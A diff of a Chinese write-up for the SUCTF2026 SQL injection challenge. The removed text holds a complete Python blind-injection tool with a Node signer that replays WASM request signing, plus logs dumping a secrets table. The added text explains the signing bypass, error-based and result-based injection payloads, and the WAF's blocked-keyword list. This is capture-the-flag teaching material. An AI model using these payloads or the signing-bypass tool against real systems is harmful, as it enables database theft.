@@ -1,784 +1,264 @@
 # SUCTF2026-sqli
 
 ## 题目简述
-题目是带前端签名的 SQL 注入。附件中的 `app.js` 和两个 Go wasm 文件定义签名流程：页面先请求 `/api/sign`，加载 wasm 生成签名，再携带 `q/nonce/ts/sign` 访问 `/api/query`；只有复现签名和浏览器环境材料，后端注入点才可用。wasm 二进制本身不适合全文写入，WP 应保留签名材料、环境字段和 SQL 注入绕过过程。
+
+题目是一个带客户端签名保护的 PostgreSQL 搜索接口。前端先从 `/api/sign` 获取一次性 `nonce`、时间戳、salt 和被拆包混淆的 seed，再通过两个 Go WASM 模块与一层 JavaScript glue 计算签名；只有携带有效签名的 `/api/query` 请求才会进入 SQL 查询。
+
+签名通过后，`q` 被直接拼进 `ILIKE` 字符串，存在 SQL 注入。官方预期利用 PostgreSQL 17 的 `JSON_VALUE ... RETURNING INTEGER ERROR ON ERROR` 构造错误型布尔 oracle，在 WAF 的 256 字节限制内二分读出 `secrets.flag`。总 WP 使用搜索结果“有记录/无记录”作为另一种布尔 oracle，同样可行，但不是官方单题 WP 的主线。
 
 ## 解题过程
-页面加载后，核心流程是：
 
-1. 请求 /api/sign
+### 1. 还原请求协议与一次性 nonce
 
-2. 获取 nonce / seed / salt / ts
+`GET /api/sign` 返回：
 
-3. 加载两个 Go 编译出来的 wasm
-
-4. 通过 wasm 生成签名 sign
-
-5. 携带 q + nonce + ts + sign 请求 /api/query
-
-也就是说，如果不能复现前端签名逻辑，后端接口就没法正常打。
-
-在 app.js 中可以看到：
-- /api/sign 会返回签名材料
-
-对应 __suPrep • crypto1.wasm
-
-对应 __suFinish • crypto2.wasm
-
-前端签名时还会把以下环境信息拼进去：
-
-- navigator.userAgent
-- navigator.userAgentData.brands
-- Intl.DateTimeFormat().resolvedOptions().timeZone
-- navigator.webdriver
-
-最后构造成一个 probe 字符串：
-
-wd=0;tz=...;b=...;intl=1
-
-然后签名流程大致是：
-
-1. __suPrep(...)
-
-2. 对结果做 unscramble
-
-3. 对结果做 mixSecret
-
-4. __suFinish(...)
-
-5. 得到最终 sign
-
-因此本题第一阶段目标非常明确：把前端的签名逻辑本地复现出来。
-
-复现签名：
-
-app.js 里其实已经把签名链暴露得很完整了。前端会：
-
-1. 调 /api/sign 获取 nonce / seed / salt / ts
-
-2. 加载 crypto1.wasm 和 crypto2.wasm
-
-3. 调用 __suPrep(...)
-
-4. 对结果做 unscramble(...)
-
-5. 再做 mixSecret(...)
-
-6. 最后调用 __suFinish(...)
-
-其中：
-
-- b64UrlToBytes
-- bytesToB64Url
-- maskBytes
-- unscramble
-- probeMask
-- mixSecret
-
-这些函数都直接写在 app.js 里，属于明文逻辑，照着搬到本地即可。
-
-而真正的核心计算没有必要完全重写，因为题目已经把实现编译进了 wasm。前端加载：
-
-- crypto1.wasm
-- crypto2.wasm
-- wasm_exec.js
-
-之后，会在全局注册：
-
-- __suPrep
-- __suFinish
-
-所以本地签名器做的事情其实是：
-
-1. 在 Node 环境里加载题目的 wasm_exec.js
-
-2. 实例化题目的 crypto1.wasm
-
-3. 实例化题目的 crypto2.wasm
-
-4. 直接调用题目原始实现里的 __suPrep / __suFinish
-
-5. 把 app.js 里可见的 unscramble / mixSecret 流程接起来
-
-也就是说，这个签名器本质上是“把浏览器里的签名过程搬到本地执行”，而不是从零逆向重写一整
-
-套算法。
-
-一开始我以为只要把算法抠出来就行，但直接请求后端时得到的是：
-
-说明问题不只是算法。
-
-继续对比前端代码后发现，签名其实和浏览器指纹绑定。也就是说，服务端不仅验证 q / nonce
-/ ts / sign ，还会隐式依赖请求头和浏览器环境。
-
-最终验证下来，要稳定通过签名校验，需要带一组接近 Chrome 的请求头，例如：
-
-```
-<br class="Apple-interchange-newline"><div></div>
-
-1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
-(KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
-2
-sec-ch-ua: "Not:A-Brand";v="24", "Chromium";v="134", "Google Chrome";v="134"
-3
-sec-ch-ua-mobile: ?0
-4
-sec-ch-ua-platform: "Windows"
+```json
+{
+  "ok": true,
+  "data": {
+    "nonce": "<base64url>",
+    "ts": 0,
+    "seed": "<四段base64url，以点分隔>",
+    "salt": "<base64url>",
+    "algo": "v6"
+  }
+}
 ```
 
-应的 probe 也要保持一致：
+`POST /api/query` 需要：
 
-wd=0;tz=Asia/Shanghai;b=Not:A-Brand:24,Chromium:134,Google
-Chrome:134;intl=1
+```json
+{
+  "q": "search text",
+  "nonce": "...",
+  "ts": 0,
+  "sign": "..."
+}
+```
 
-这一步打通后，接口就能返回正常结果了。
+服务端的 `NonceStore` 有两个重要约束：
 
-签名过掉之后，开始测试 q 参数。
+- nonce 保存时间为 60 秒；
+- `Consume` 校验成功或失败取得条目后都会把 nonce 删除，不能重复使用。
 
-当输入单引号 ' 时，后端报错：
+因此盲注的每一次条件判断都要重新请求 `/api/sign` 并重新计算签名。签名内部使用 `ts/30000` 作为 30 秒 bucket，但这不等于 nonce 可以复用 30 秒。
 
-ERROR: unterminated quoted string at or near "' LIMIT 20" (SQLSTATE
-42601)
+签名还绑定 `User-Agent`：服务端签发 seed 时记录第一次请求的 UA，校验 query 时又用第二次请求的 UA 计算预期签名，所以两次请求必须使用完全相同的 UA。
 
-这个报错很关键，可以直接得出两点：
+### 2. 区分真正绑定项与前端混淆项
 
-1. q 被拼进了 SQL 语句的字符串上下文
+`application/app.js` 生成的 probe 为：
 
-2. 数据库是 PostgreSQL
+```text
+wd=<webdriver>;tz=<timezone>;b=<brands>;intl=<0或1>
+```
 
-因此基本可以推测后端查询类似：
+浏览器流程是：
 
-SELECT ... FROM posts WHERE title ILIKE '%<q>%' LIMIT 20
+```text
+__suPrep(...)           // crypto1.wasm
+  -> unscramble(...)    // app.js
+  -> mixSecret(probe)   // app.js
+  -> __suFinish(...)    // crypto2.wasm
+  -> sign
+```
 
-于是可以确认，这题真正的漏洞点就在 q 。
+从当前仓库服务端 `sign.Sign` 可见，最终校验只使用：
 
-继续测 payload，可以发现常见关键字基本都被拦了：
-- --
-- or
-- and
-- union
-- ;
-- information_schema
-- pg_attribute
+```text
+method | path | q | nonce | ts | User-Agent | salt | server secret
+```
 
-被拦时返回：
+服务端不接收 probe，也不读取 `sec-ch-ua`、时区或 brands。WASM2 会先执行 `unmix`，恰好逆掉 JS 的 `mixSecret`，所以 probe 的正常混合不会进入最终签名；它主要用于增加逆向噪声。唯一需要注意的是 WASM1 的：
 
-{"ok":false,"error":"blocked"}
+```go
+if len(q) == 0 || method == "GET" || isDebug(probe) {
+    return decoy(...)
+}
+```
 
-这意味着常规的联合查询、报错注入、注释截断这几条路基本都走不通，必须找更“表达式化”的注
+其中 `isDebug` 检查 `wd=1`。本地签名器应使用 `wd=0`，否则得到的是 decoy。总 WP 中“必须复制完整 Chrome Client Hints 才能通过”的现象可能来自赛时脚本或环境差异；按当前源码，必要的请求头只有前后保持一致的 `User-Agent`。
 
-入方式。
+### 3. 方案一：按官方源码直接复现签名
 
-由于 q 落在字符串上下文里，所以最自然的利用方式是字符串拼接：
+服务端 `SeedPackFor` 先生成：
 
-'||(select ...)||'
+```text
+k1    = KDF(nonce || little_endian(ts) || "k9v3_suctf26_sigma", SALT_SEED)
+seed  = server_secret XOR k1
+dyn   = uaMixKey(User-Agent, salt, ts)
+seedX = permute(seed XOR dyn)
+```
 
-为了做布尔盲注，我构造了这样一个通用 payload：
+然后把 `seedX` 切成四个 8 字节块。块顺序、左右随机填充长度和逐字节 XOR mask 都由：
 
-'||(select case when <condition> then 'su' else 'zzzzzz' end)||'
+```text
+KDF(nonce || "|" || salt || "|" || ts/30000, SALT_PERM)
+```
 
-原理是：
+决定，最后编码成四段 base64url，用 `.` 连接。
 
-- 条件为真时，搜索词里会包含 su
+本地签名器依次反向执行：
 
-- 页面会返回一条已知记录 Welcome to SU Query
+1. 根据 nonce、salt、bucket 重新得到块排列、padding 长度和 mask；
+2. 对每段 base64url 解码，剥离左右 padding，撤销 `mask[idx] + j*17`；
+3. 按原索引拼回 32 字节并执行 `permuteInv`；
+4. 结合同一 UA 计算 `dyn`，恢复 server secret 的等价中间值；
+5. 对消息 `POST|/api/query|q|ts|nonce` 计算消息 KDF；
+6. XOR、逐 32 位字旋转排列，最后输出 base64url。
 
-- 条件为假时，搜索 zzzzzz
+可以把核心关系化简为：
 
-- 返回空结果
+```text
+secret2 = server_secret XOR uaMixKey(ua, salt, ts)
+m       = KDF("POST|/api/query|" + q + "|" + ts + "|" + nonce, SALT_MSG)
+sign    = base64url(permute(secret2 XOR m))
+```
 
-测试：
+官方 `exp/exp.py` 与 `env/web_deploy/tools/exp.py` 已给出同源 Python 实现。写入 WP 时没有必要复制数百行 KDF；复现时应直接逐函数对照 `internal/sign/sign.go`，尤其保持 32 位无符号溢出、小端序、rotate 和 raw base64url 语义一致。
+
+### 4. 方案二：直接复用原始 WASM
+
+不想把 KDF 完整移植到 Python 时，可以像总 WP 一样在 Node 中加载题目附件：
+
+```text
+wasm_exec.js
+crypto1.wasm -> 注册 globalThis.__suPrep
+crypto2.wasm -> 注册 globalThis.__suFinish
+```
+
+再从 `app.js` 搬出以下明文函数：
+
+```text
+b64UrlToBytes
+bytesToB64Url
+maskBytes
+unscramble
+probeMask
+mixSecret
+```
+
+调用顺序必须与浏览器完全一致：
+
+```javascript
+const pre = globalThis.__suPrep(
+  "POST", "/api/query", q,
+  material.nonce, String(material.ts),
+  material.seed, material.salt,
+  ua, "wd=0;tz=;b=;intl=0"
+);
+
+const secret2 = unscramble(pre, material.nonce, material.ts);
+const mixed = mixSecret(secret2, probe, material.ts);
+const sign = globalThis.__suFinish(
+  "POST", "/api/query", q,
+  material.nonce, String(material.ts),
+  bytesToB64Url(mixed), probe
+);
+```
+
+这条路线不是重新实现密码算法，而是把浏览器签名器搬进 Node。它更短，也更不易在整数溢出和字节序上出错；缺点是仍依赖题目的 WASM 与 Go runtime 文件。
+
+### 5. 确认 SQL 拼接点与 WAF
+
+服务端查询是源码级明文拼接：
+
+```go
+sql := "SELECT id, title FROM posts " +
+       "WHERE status='public' AND title ILIKE '%" + req.Q + "%' LIMIT 20"
+```
+
+输入单引号会得到 PostgreSQL 未终止字符串错误，说明 `q` 确实落在字符串上下文。WAF 会拒绝长度大于 256 的输入，并用大小写不敏感正则屏蔽：
+
+```text
+--  /*  */  ;  union  or  and
+pg_sleep  pg_read_file  copy  lo_
+current_setting  information_schema  pg_catalog
+to_number  cast  ::  chr  encode  decode  1/0
+```
+
+当前源码并没有单独屏蔽 `select`、`case`、`when`、`substr`、`ascii`、`length` 或 `JSON_VALUE`。总 WP 中提到的 `pg_attribute` 拦截不在当前 WAF 正则里，应以运行实例为准，不要把它写成固定源码事实。
+
+### 6. 官方主线：PG17 JSON 错误 oracle
+
+PostgreSQL 17 支持 SQL/JSON 的 `JSON_VALUE`，并允许指定返回类型及出错行为。下面的表达式会尝试把字符串 `x` 转成整数，并在转换失败时抛错：
+
+```sql
+JSON_VALUE('{"a":"x"}', '$.a'
+           RETURNING INTEGER ERROR ON ERROR)
+```
+
+将它放入 `CASE`：
+
+```sql
+' || (SELECT CASE WHEN (<condition>)
+     THEN JSON_VALUE('{"a":"x"}', '$.a'
+                     RETURNING INTEGER ERROR ON ERROR)
+     ELSE 0 END) || '
+```
+
+这里 `ELSE 0` 很重要：`THEN` 分支的声明返回类型是 INTEGER，另一分支也必须给整数，避免先因 `CASE` 类型不一致产生与条件无关的错误。
+
+布尔含义为：
+
+```text
+condition 为真  -> 执行 JSON_VALUE 强制转换 -> API 返回 ok=false 与数据库错误
+condition 为假  -> CASE 返回 0             -> 查询正常，API 返回 ok=true
+```
+
+先分别测试 `1=1` 与 `1=0`。官方脚本准备了 `ERROR ON ERROR` 与 `ON ERROR ERROR` 两种语序模板，逐个试出当前 PostgreSQL 构建接受的形式，再开始二分。
+
+长度条件：
+
+```sql
+length((select flag from secrets limit 1)) > <mid>
+```
+
+字符条件：
+
+```sql
+ascii(substr((select flag from secrets limit 1), <pos>, 1)) > <mid>
+```
+
+对长度和可打印 ASCII 区间分别二分，每次重新取得 nonce、按同一 UA 签名 payload，再根据 `ok` 判断条件。这样每个字符只需约 7 次请求，同时能保持 payload 小于 256 字节。
+
+### 7. 替代路线：利用搜索结果构造布尔 oracle
+
+总 WP 使用字符串拼接而不主动制造错误：
+
+```sql
+'||(select case when <condition>
+    then 'su' else 'zzzzzz' end)||'
+```
+
+数据库种子中存在标题 `Welcome to SU Query`。条件为真时，最终 `ILIKE` 搜索词包含 `su`，响应 `data` 有记录；条件为假时搜索不存在的 `zzzzzz`，响应为空。测试：
 
 ```sql
 '||(select case when 1=1 then 'su' else 'zzzzzz' end)||'
 '||(select case when 1=2 then 'su' else 'zzzzzz' end)||'
 ```
 
-前者有结果，后者无结果，说明这条盲注通道是成立的。
-
-先拿 version() 做测试：
-
-结果为真，说明确实是 PostgreSQL。
-
-进一步盲取 version() 的前几个字符，得到：
+若一有结果、一无结果，即可用相同的 `length`、`ascii(substr(...))` 条件二分。黑盒枚举时，`information_schema` 被屏蔽，可以用未限定 schema 名的 `pg_tables` 找 public 表；若列枚举受限，也可把整行转成 JSON：
 
 ```sql
-python blind_sqli.py --base http://<target>:10001 str
-"substring((select version()),1,12)" --max-len 12
->>
-[+] length = 12
-[1/12] P
-[2/12] Po
-[3/12] Pos
-[4/12] Post
-[5/12] Postg
-[6/12] Postgr
-[7/12] Postgre
-[8/12] PostgreS
-[9/12] PostgreSQ
-[10/12] PostgreSQL
-[11/12] PostgreSQL
-[12/12] PostgreSQL 1
-PostgreSQL 1
+concat((select to_json(x)
+        from (select * from secrets limit 1) x))
 ```
 
-PostgreSQL 1
+再逐字符读取。该路线依赖已知搜索词在 `posts` 中稳定命中；官方错误 oracle 不依赖结果集内容，通常更稳。
 
-到这里，注入链已经验证稳定，可以放心进入信息枚举阶段。
+### 8. 最终结果
 
-由于 information_schema 被拦，改用 PostgreSQL 自带的 pg_tables 。
-
-先统计 public schema 下的表数量：
-
-$$
-(select count(*) from pg_tables where schemaname='public')
-$$
-
-```sql
-python blind_sqli.py --base http://<target>:10001 int "(select count(*)
-from pg_tables where schemaname='public')" --max 20
->>
-2
-```
-
-再按表名排序逐个取：
-
-```sql
-(select tablename from pg_tables where schemaname='public' order by tablename
-limit 1)
-(select tablename from pg_tables where schemaname='public' order by tablename
-offset 1 limit 1)
-```
-
-```
-python blind_sqli.py --base http://<target>:10001 str "(select
-tablename from pg_tables where schemaname='public' order by tablename limit
-1)" --max-len 32
->>
-[+] length = 5
-[1/5] p
-[2/5] po
-[3/5] pos
-[4/5] post
-[5/5] posts
-posts
-
-python blind_sqli.py --base http://<target>:10001 str "(select
-tablename from pg_tables where schemaname='public' order by tablename offset 1
-limit 1)" --max-len 32
->>
-[+] length = 7
-[1/7] s
-[2/7] se
-[3/7] sec
-[4/7] secr
-[5/7] secre
-[6/7] secret
-[7/7] secrets
-
-secrets
-```
-
-最终得到两张表：
-
-- posts
-- secrets
-
-posts 明显是前台搜索内容，secrets 一看就是目标表。
-
-按正常思路，下一步应该枚举 secrets 表的列名。但我在尝试 pg_attribute 时发现它会被
-WAF 直接拦截。
-
-所以这里换一种更直接的思路：不去枚举列，而是直接把整行转成 JSON 文本，再逐字符盲取。
-
-可用表达式是：
-
-$$
-concat((select to_json(x) from (select * from secrets limit 1) x))
-$$
-
-然后结合 substring 和 ascii 做字符盲注即可。
-
-例如布尔判断模板可以写成：
-
-$$
-'||(select case when ascii(substring((<expr>),<pos>,1))>=<mid> then
-$$
-'su' else 'zzzzzz' end)||'
-
-这样就可以对整行 JSON 做二分盲注。
-
-为了避免手工逐位猜测，我又写了一个脚本自动跑盲注（签名器在脚本已存在）
-
-```python
-import argparse
-import atexit
-import json
-import os
-import subprocess
-import sys
-import tempfile
-import urllib.error
-import urllib.request
-from pathlib import Path
-
-DEFAULT_BASE = "http://<target>:10001"
-UA = (
-"Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
-"AppleWebKit/537.36 (KHTML, like Gecko) "
-"Chrome/134.0.0.0 Safari/537.36"
-)
-SEC_CH_UA = '"Not:A-Brand";v="24", "Chromium";v="134", "Google Chrome";v="134"'
-
-PROBE = "wd=0;tz=Asia/Shanghai;b=Not:A-Brand:24,Chromium:134,Google
-Chrome:134;intl=1"
-APP_ROOT = str((Path(__file__).resolve().parent / "application"))
-SIGN_SCRIPT = None
-EMBEDDED_SIGNER = r"""
-const fs = require("fs");
-const path = require("path");
-const vm = require("vm");
-const { webcrypto } = require("crypto");
-
-globalThis.crypto = webcrypto;
-
-const root = process.env.APPLICATION_ROOT;
-
-function b64UrlToBytes(s) {
-let t = s.replace(/-/g, "+").replace(/_/g, "/");
-while (t.length % 4) t += "=";
-return Uint8Array.from(Buffer.from(t, "base64"));
-}
-
-function bytesToB64Url(bytes) {
-return Buffer.from(bytes)
-.toString("base64")
-.replace(/\+/g, "-")
-.replace(/\//g, "_")
-.replace(/=+$/g, "");
-}
-
-function rotl32(x, r) {
-return ((x << r) | (x >>> (32 - r))) >>> 0;
-}
-
-function rotr32(x, r) {
-return ((x >>> r) | (x << (32 - r))) >>> 0;
-}
-
-function maskBytes(nonceB64, ts) {
-const nb = b64UrlToBytes(nonceB64);
-let s = 0 >>> 0;
-for (let i = 0; i < nb.length; i++) {
-s = (Math.imul(s, 131) + nb[i]) >>> 0;
-}
-const hi = Math.floor(ts / 0x100000000);
-s = (s ^ (ts >>> 0) ^ (hi >>> 0)) >>> 0;
-const out = new Uint8Array(32);
-for (let i = 0; i < 32; i++) {
-s ^= (s << 13) >>> 0;
-
-s ^= s >>> 17;
-s ^= (s << 5) >>> 0;
-out[i] = s & 0xff;
-}
-return out;
-}
-
-function unscramble(pre, nonceB64, ts) {
-const rotScr = [1, 5, 9, 13, 17, 3, 11, 19];
-const buf = b64UrlToBytes(pre);
-for (let i = 0; i < 8; i++) {
-const o = i * 4;
-let w =
-(buf[o] | (buf[o + 1] << 8) | (buf[o + 2] << 16) | (buf[o + 3] << 24))
->>> 0;
-w = rotr32(w, rotScr[i]);
-buf[o] = w & 0xff;
-buf[o + 1] = (w >>> 8) & 0xff;
-buf[o + 2] = (w >>> 16) & 0xff;
-buf[o + 3] = (w >>> 24) & 0xff;
-}
-const mask = maskBytes(nonceB64, ts);
-for (let i = 0; i < 32; i++) buf[i] ^= mask[i];
-return buf;
-}
-
-function probeMask(probe, ts) {
-let s = 0 >>> 0;
-for (let i = 0; i < probe.length; i++) {
-s = (Math.imul(s, 33) + probe.charCodeAt(i)) >>> 0;
-}
-const hi = Math.floor(ts / 0x100000000);
-s = (s ^ (ts >>> 0) ^ (hi >>> 0)) >>> 0;
-const out = new Uint8Array(32);
-for (let i = 0; i < 32; i++) {
-s = (Math.imul(s, 1103515245) + 12345) >>> 0;
-out[i] = (s >>> 16) & 0xff;
-}
-return out;
-}
-
-function mixSecret(buf, probe, ts) {
-const mask = probeMask(probe, ts);
-if (mask[0] & 1) {
-for (let i = 0; i < 32; i += 2) {
-const t = buf[i];
-buf[i] = buf[i + 1];
-
-buf[i + 1] = t;
-}
-}
-if (mask[1] & 2) {
-for (let i = 0; i < 8; i++) {
-const o = i * 4;
-let w =
-(buf[o] | (buf[o + 1] << 8) | (buf[o + 2] << 16) | (buf[o + 3] << 24))
->>> 0;
-w = rotl32(w, 3);
-buf[o] = w & 0xff;
-buf[o + 1] = (w >>> 8) & 0xff;
-buf[o + 2] = (w >>> 16) & 0xff;
-buf[o + 3] = (w >>> 24) & 0xff;
-}
-}
-for (let i = 0; i < 32; i++) buf[i] ^= mask[i];
-return buf;
-}
-
-function loadGoRuntime() {
-const wasmExec = fs.readFileSync(path.join(root, "wasm_exec.js"), "utf8");
-vm.runInThisContext(wasmExec, { filename: "wasm_exec.js" });
-}
-
-async function loadWasm(file) {
-const go = new Go();
-const wasm = await WebAssembly.instantiate(fs.readFileSync(path.join(root,
-file)), go.importObject);
-go.run(wasm.instance);
-}
-
-async function init() {
-loadGoRuntime();
-await loadWasm("crypto1.wasm");
-await loadWasm("crypto2.wasm");
-if (typeof globalThis.__suPrep !== "function" || typeof
-globalThis.__suFinish !== "function") {
-throw new Error("wasm init failed");
-}
-}
-
-function buildSig(material, q, ua, probe) {
-const pre = globalThis.__suPrep(
-"POST",
-"/api/query",
-q,
-
-material.nonce,
-String(material.ts),
-material.seed,
-material.salt,
-ua,
-probe
-);
-if (!pre) {
-throw new Error("prep failed");
-}
-const secret2 = unscramble(pre, material.nonce, material.ts);
-const mixed = mixSecret(secret2, probe, material.ts);
-return globalThis.__suFinish(
-"POST",
-"/api/query",
-q,
-material.nonce,
-String(material.ts),
-bytesToB64Url(mixed),
-probe
-);
-}
-
-async function main() {
-const [qArg, uaArg, probeArg] = process.argv.slice(2);
-const q = process.env.QUERY_VALUE || qArg;
-const ua = uaArg || "";
-const probe = probeArg || "";
-
-await init();
-const materialJson = process.env.MATERIAL_JSON ?
-JSON.parse(process.env.MATERIAL_JSON) : null;
-if (!materialJson || !q) {
-throw new Error("missing MATERIAL_JSON or QUERY_VALUE");
-}
-const material = materialJson.data || materialJson;
-const sign = buildSig(material, q, ua, probe);
-console.log(
-JSON.stringify(
-{
-q,
-ua,
-probe,
-nonce: material.nonce,
-ts: material.ts,
-sign,
-},
-
-null,
-2
-)
-);
-}
-
-main().catch((err) => {
-console.error(err);
-process.exit(1);
-});
-"""
-
-HEADERS = {
-"User-Agent": UA,
-"sec-ch-ua": SEC_CH_UA,
-"sec-ch-ua-mobile": "?0",
-"sec-ch-ua-platform": '"Windows"',
-}
-
-def _cleanup_signer(path):
-try:
-if path and os.path.exists(path):
-os.unlink(path)
-except OSError:
-pass
-
-def get_sign_script():
-global SIGN_SCRIPT
-if SIGN_SCRIPT:
-return SIGN_SCRIPT
-fd, path = tempfile.mkstemp(prefix="su_sqli_sign_", suffix=".js")
-with os.fdopen(fd, "w", encoding="utf-8", newline="\n") as fh:
-fh.write(EMBEDDED_SIGNER)
-atexit.register(_cleanup_signer, path)
-SIGN_SCRIPT = path
-return SIGN_SCRIPT
-
-def http_json(url, method="GET", headers=None, body=None, timeout=20):
-data = None
-req_headers = dict(headers or {})
-if body is not None:
-data = json.dumps(body).encode()
-req_headers["Content-Type"] = "application/json"
-
-req = urllib.request.Request(url, data=data, headers=req_headers,
-method=method)
-try:
-
-with urllib.request.urlopen(req, timeout=timeout) as resp:
-return json.loads(resp.read().decode())
-except urllib.error.HTTPError as exc:
-text = exc.read().decode()
-try:
-return json.loads(text)
-except json.JSONDecodeError:
-raise RuntimeError(text) from exc
-
-def get_material(base):
-return http_json(f"{base}/api/sign", headers=HEADERS)
-
-def sign_query(material, query):
-env = os.environ.copy()
-env["MATERIAL_JSON"] = json.dumps(material, separators=(",", ":"))
-env["QUERY_VALUE"] = query
-env["APPLICATION_ROOT"] = APP_ROOT
-proc = subprocess.run(
-["node", get_sign_script(), "_", UA, PROBE],
-capture_output=True,
-text=True,
-env=env,
-check=True,
-)
-return json.loads(proc.stdout)
-
-def signed_query(base, query):
-material = get_material(base)
-sig = sign_query(material, query)
-body = {
-"q": query,
-"nonce": sig["nonce"],
-"ts": sig["ts"],
-"sign": sig["sign"],
-}
-return http_json(f"{base}/api/query", method="POST", headers=HEADERS,
-body=body)
-
-def test_condition(base, condition):
-payload = f"'||(select case when {condition} then 'su' else 'zzzzzz'
-end)||'"
-result = signed_query(base, payload)
-if result.get("ok") is not True:
-raise RuntimeError(result)
-return len(result.get("data", [])) > 0
-
-def get_int_value(base, expr, upper_bound):
-
-for i in range(upper_bound + 1):
-if test_condition(base, f"(({expr})={i})"):
-return i
-raise RuntimeError(f"int not found: {expr}")
-
-def get_string_value(base, expr, max_len):
-length = get_int_value(base, f"length(({expr}))", max_len)
-print(f"[+] length = {length}")
-chars = []
-for pos in range(1, length + 1):
-lo, hi = 32, 126
-while lo < hi:
-mid = (lo + hi + 1) // 2
-cond = f"(ascii(substring(({expr}),{pos},1))>={mid})"
-if test_condition(base, cond):
-lo = mid
-else:
-hi = mid - 1
-chars.append(chr(lo))
-print(f"[{pos}/{length}] {''.join(chars)}")
-return "".join(chars)
-
-def build_parser():
-parser = argparse.ArgumentParser(description="Blind SQLi helper for
-SU_sqli")
-parser.add_argument("--base", default=DEFAULT_BASE, help="target base url")
-sub = parser.add_subparsers(dest="mode", required=True)
-
-p_query = sub.add_parser("query", help="send a raw q value and print the
-JSON response")
-p_query.add_argument("q", help="raw q parameter")
-
-p_bool = sub.add_parser("bool", help="test a boolean SQL condition")
-p_bool.add_argument("condition", help="SQL condition, e.g. (1=1)")
-
-p_int = sub.add_parser("int", help="read an integer SQL expression")
-p_int.add_argument("expr", help="SQL expression")
-p_int.add_argument("--max", type=int, default=128, help="max integer to
-try")
-
-p_str = sub.add_parser("str", help="read a string SQL expression")
-p_str.add_argument("expr", help="SQL expression")
-p_str.add_argument("--max-len", type=int, default=128, help="max string
-length")
-
-p_flag = sub.add_parser("flag", help="dump the first row of secrets as
-JSON")
-
-p_flag.add_argument(
-"--max-len",
-type=int,
-default=128,
-help="max string length",
-)
-
-return parser
-
-def main():
-args = build_parser().parse_args()
-
-if args.mode == "query":
-print(json.dumps(signed_query(args.base, args.q), ensure_ascii=False,
-indent=2))
-return
-
-if args.mode == "bool":
-print(test_condition(args.base, args.condition))
-return
-
-if args.mode == "int":
-print(get_int_value(args.base, args.expr, args.max))
-return
-
-if args.mode == "str":
-print(get_string_value(args.base, args.expr, args.max_len))
-return
-
-if args.mode == "flag":
-expr = "concat((select to_json(x) from (select * from secrets limit 1)
-x))"
-print(get_string_value(args.base, expr, args.max_len))
-return
-
-raise RuntimeError("unknown mode")
-
-if __name__ == "__main__":
-try:
-main()
-except subprocess.CalledProcessError as exc:
-sys.stderr.write(exc.stderr or str(exc))
-sys.exit(1)
-except Exception as exc:
-sys.stderr.write(f"{exc}\n")
-sys.exit(1)
-```
+`db/init.sql` 中的静态 flag 为：
 
 ```text
-python blind_sqli.py --base http://<target>:10001 str "concat((select
-to_json(x) from (select * from secrets limit 1) x))" --max-len 128
->>
-[+] length = 54
-[1/54] {
-[2/54] {"
-[3/54] {"i
-[4/54] {"id
-[5/54] {"id"
-[6/54] {"id":
-[7/54] {"id":1
-[8/54] {"id":1,
-[9/54] {"id":1,"
-[10/54] {"id":1,"f
-[11/54] {"id":1,"fl
-[12/54] {"id":1,"fla
-[13/54] {"id":1,"flag
-[14/54] {"id":1,"flag"
-[15/54] {"id":1,"flag":
-[16/54] {"id":1,"flag":"
-[17/54] {"id":1,"flag":"S
-[18/54] {"id":1,"flag":"SU
-[19/54] {"id":1,"flag":"SUC
-[20/54] {"id":1,"flag":"SUCT
-[21/54] {"id":1,"flag":"SUCTF
-[22/54] {"id":1,"flag":"SUCTF{
-[23/54] {"id":1,"flag":"SUCTF{P
-[24/54] {"id":1,"flag":"SUCTF{P9
-[25/54] {"id":1,"flag":"SUCTF{P9s
-[26/54] {"id":1,"flag":"SUCTF{P9s9
-[27/54] {"id":1,"flag":"SUCTF{P9s9L
-[28/54] {"id":1,"flag":"SUCTF{P9s9L_
-[29/54] {"id":1,"flag":"SUCTF{P9s9L_!
-[30/54] {"id":1,"flag":"SUCTF{P9s9L_!N
-[31/54] {"id":1,"flag":"SUCTF{P9s9L_!Nj
-[32/54] {"id":1,"flag":"SUCTF{P9s9L_!Nje
-[33/54] {"id":1,"flag":"SUCTF{P9s9L_!Njec
-[34/54] {"id":1,"flag":"SUCTF{P9s9L_!Nject
-[35/54] {"id":1,"flag":"SUCTF{P9s9L_!Nject!
-[36/54] {"id":1,"flag":"SUCTF{P9s9L_!Nject!O
-[37/54] {"id":1,"flag":"SUCTF{P9s9L_!Nject!On
-[38/54] {"id":1,"flag":"SUCTF{P9s9L_!Nject!On_
-[39/54] {"id":1,"flag":"SUCTF{P9s9L_!Nject!On_I
-[40/54] {"id":1,"flag":"SUCTF{P9s9L_!Nject!On_IS
-
-[41/54] {"id":1,"flag":"SUCTF{P9s9L_!Nject!On_IS_
-[42/54] {"id":1,"flag":"SUCTF{P9s9L_!Nject!On_IS_3
-[43/54] {"id":1,"flag":"SUCTF{P9s9L_!Nject!On_IS_3@
-[44/54] {"id":1,"flag":"SUCTF{P9s9L_!Nject!On_IS_3@$
-[45/54] {"id":1,"flag":"SUCTF{P9s9L_!Nject!On_IS_3@$Y
-[46/54] {"id":1,"flag":"SUCTF{P9s9L_!Nject!On_IS_3@$Y_
-[47/54] {"id":1,"flag":"SUCTF{P9s9L_!Nject!On_IS_3@$Y_R
-[48/54] {"id":1,"flag":"SUCTF{P9s9L_!Nject!On_IS_3@$Y_Ri
-[49/54] {"id":1,"flag":"SUCTF{P9s9L_!Nject!On_IS_3@$Y_RiG
-[50/54] {"id":1,"flag":"SUCTF{P9s9L_!Nject!On_IS_3@$Y_RiGh
-[51/54] {"id":1,"flag":"SUCTF{P9s9L_!Nject!On_IS_3@$Y_RiGht
-[52/54] {"id":1,"flag":"SUCTF{P9s9L_!Nject!On_IS_3@$Y_RiGht}
-[53/54] {"id":1,"flag":"SUCTF{P9s9L_!Nject!On_IS_3@$Y_RiGht}"
-[54/54] {"id":1,"flag":"SUCTF{P9s9L_!Nject!On_IS_3@$Y_RiGht}"}
-{"id":1,"flag":"SUCTF{P9s9L_!Nject!On_IS_3@$Y_RiGht}"}
+SUCTF{P9s9L_!Nject!On_IS_3@$Y_RiGht}
 ```
 
+线上若通过推送脚本更新 `secrets.flag`，应以盲注结果为准。
+
 ## 方法总结
-- 核心技巧：前端 wasm 签名复现 + SQLi
-- 识别信号：接口调用必须带 nonce/ts/sign，签名由 wasm 和浏览器环境共同生成。
